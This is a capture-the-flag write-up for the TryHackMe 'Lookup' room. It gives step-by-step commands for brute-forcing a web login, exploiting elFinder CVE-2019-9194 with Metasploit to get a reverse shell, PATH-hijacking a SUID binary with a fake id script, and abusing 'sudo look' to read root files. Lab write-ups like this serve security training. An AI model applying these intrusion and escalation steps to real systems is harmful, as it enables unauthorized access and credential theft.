---
title: "Lookup - TryHackMe"
date: 2026-04-10 02:00:00 +0000
categories: [TryHackMe, Writeups]
tags: [privilege-escalation, CVE-2019-9194, path-hijacking]
image: /assets/img/writeups/covers/lookup.png
---
# Lookup - TryHackMe
**Difficulty**: Easy<br>**Time Required**: 40 min
![1.png](/assets/img/writeups/lookup/1.png)
[Lookup](https://tryhackme.com/room/lookup) is a beginner-friendly Linux machine on TryHackMe that emphasizes the importance of thorough enumeration and identifying common web vulnerabilities. The room follows a classic "boot-to-root" path, challenging you to move from initial reconnaissance to full system compromise through a series of logical steps. 
## Enumeration
Before proceeding, add `lookup.thm` to your `/etc/hosts` file.
![1.png](/assets/img/writeups/lookup/2.png)
````
$ nmap -p- 10.112.136.63 -sV -T4 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-10 10:12 +0500
Nmap scan report for 10.112.136.63 (10.112.136.63)
Host is up (0.15s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp    open     http    Apache httpd 2.4.41 ((Ubuntu))
33248/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 729.50 seconds
````
**Results:**
| Port | Service |
|------|---------|
| 22   | SSH     |
| 80   | HTTP    |
| 33248   | Unknown    |

### Port 80
Visiting this port presents a login page.<br><br>When I tried logging in with random credentials, I was redirected to `/login.php` and then sent back to the main page after 3 seconds.
![1.png](/assets/img/writeups/lookup/5.png)
## Exploitation
So it looks like I can try brute-forcing usernames and then passwords. For this purpose, I used `Caido`. Unlike `Burp Suite`, it can perform Intruder-style automated attacks more efficiently.<br><br>First, I observed the raw response and its content length. After that, I sent the request to the automation feature, set the placeholder on the username field, and selected a username wordlist. For this task, I chose:
````
/usr/share/seclists/Usernames/Names/names.txt
````
![1.png](/assets/img/writeups/lookup/3.png)
After running the attack for a few iterations, I filtered the results by content length and identified two valid usernames: `admin` and `jose`.

![1.png](/assets/img/writeups/lookup/4.png)
Now that I had a valid username `jose`, I proceeded to brute-force the password as well. This time, I set the placeholder on the password field and kept the username fixed as `jose`.<br><br>I ran the attack for several minutes and then filtered the results by content length again. This revealed the correct password for the user `jose`.
![1.png](/assets/img/writeups/lookup/6.png)

After logging in with valid credentials, the application redirects to `http://files.lookup.thm`. To continue the attack, this domain also needs to be added to the `/etc/hosts` file.
![1.png](/assets/img/writeups/lookup/7.png)
````
GNU nano 8.7.1	    /etc/hosts
# others
10.112.136.63 lookup.thm files.lookup.thm
````
> The target machine stopped responding during testing, so Irestarted it to continue the exploitation process.
### ElFinder File Manager
After logging in through the browser, I was presented with an elFinder web interface, a browser-based file manager.<br><br>While exploring its features, I checked the **About this software** section and discovered the version: `elFinder 2.1.47`
![1.png](/assets/img/writeups/lookup/8.png)
### CVE-2019-9194
After identifying the version, I went to Exploit-DB and searched for it. I found that it is vulnerable to **CVE-2019-9194 (Command Injection)**.<br><br>This vulnerability exists in the elFinder PHP connector, where improper input handling allows an attacker to inject system commands. This can lead to remote code execution (RCE) on the server.
### Exploitation Using Metasploit
To exploit this vulnerability, I used the Metasploit framework.
![1.png](/assets/img/writeups/lookup/9.png)
Selecting the Exploit Module:
````
use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
````
Setting Required Options:
```
set RHOST files.lookup.thm
set LHOST 192.168.153.26
```
- RHOST → Target domain
- LHOST → Attacker machine IP

Run the exploit:
````
exploit
````
After execution, the exploit successfully triggered the vulnerability and a session was established.
![1.png](/assets/img/writeups/lookup/10.png)
To interact with a standard system shell run:
````
shell
````
After obtaining a shell, I upgraded it to a TTY for stability using python pty.
````
python3 -c 'import pty; pty.spawn("/bin/bash")'
````
## Privilege escalation
While exploring the system, I attempted to read:
````
/home/think/user.txt
````

Access was denied because I was running as: `www-data`
### Privilege Escalation to User `think`
**Finding SUID Binaries:**<br>To identify privilege escalation vectors, I searched for SUID binaries.
````
find / -perm -u=s 2>/dev/null
````
This revealed an unusual binary:
````
/usr/sbin/pwm
````
![1.png](/assets/img/writeups/lookup/12.png)
#### Understanding the Binary
The pwm binary has a critical flaw in how it handles system commands. It calls the id command using a relative path instead of an absolute path like `/usr/bin/id`, which allows the executed command to be controlled via the PATH environment variable. Additionally, it attempts to read a `.passwords` file from the user’s home directory. This combination makes it vulnerable to PATH hijacking and potential privilege escalation.
#### Exploiting PATH Hijacking
**Step 1**: Create a Fake id Command
````
echo '#!/bin/bash' > /tmp/id
````
This creates a fake executable named `id` in `/tmp`.
````
echo 'echo "uid=1001(think) gid=1001(think) groups=1001(think)"' >> /tmp/id
````
This makes the fake `id` output mimic the real `think` user identity.
````
chmod +x /tmp/id
````
This grants execution permissions to the fake script.<br><br>**Step 2**: Modify PATH Variable
````
export PATH=/tmp:$PATH
````
This ensures `/tmp` is checked first when running commands like `id`.<br><br>**Step 3**: Execute the Vulnerable Binary
````
/usr/sbin/pwm
````
Since `pwm` calls `id` using a relative path, it executes our fake version instead.<br><br>This allowed access to the `.passwords` file located in `/home/think` directory.
![1.png](/assets/img/writeups/lookup/11.png)
#### Switching to User `think`
Inside the password file, multiple credentials were found. After testing all of them, the valid password was:
````
josemario.AKA(think)
````
**Note**: The password includes the word `think` enclosed in parentheses.<br><br>Then I switched to user `think`:
````
su think
````
To retrieve the user flag:
````
cat /home/think/user.txt
````
![1.png](/assets/img/writeups/lookup/13.png)
### Privilege Escalation to Root
**Checking Sudo Permissions**
````
sudo -l
````
The output showed that I could run:
````
(ALL) /usr/bin/look
````


From GTFOBins, I used the following misconfiguration:
````
sudo look '' /root/root.txt
````
This works because the user `think` is allowed to run the `look` command with `sudo` privileges. Since look is a file-reading utility, running it as `root` via sudo allows it to access any file on the system, including `/root/root.txt`. This effectively bypasses normal file permission restrictions, as the command executes with elevated privileges granted to the `think` user through `sudo`.<br><br>Using the above method, I was able to successfully read the root flag:
````
/root/root.txt
````
![1.png](/assets/img/writeups/lookup/14.png)

